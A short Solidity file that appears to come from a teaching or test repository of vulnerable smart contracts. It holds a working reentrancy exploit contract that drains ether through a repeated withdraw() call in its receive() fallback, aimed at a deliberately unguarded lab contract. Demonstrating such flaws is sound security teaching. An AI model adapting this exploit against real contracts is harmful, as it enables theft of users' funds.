// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "../src/missing_reentrancy_guard.sol";

contract Attacker {
    ProblematicContract public problematic_contract;

    constructor(address _problematic_contract) {
        problematic_contract = ProblematicContract(_problematic_contract);
    }

    function attack() external payable {
        problematic_contract.deposit{value: msg.value}();
        problematic_contract.withdraw();
    }
    
    receive() external payable {
        if (address(problematic_contract).balance >= 1 ether) {
            problematic_contract.withdraw();
        }
    }
}
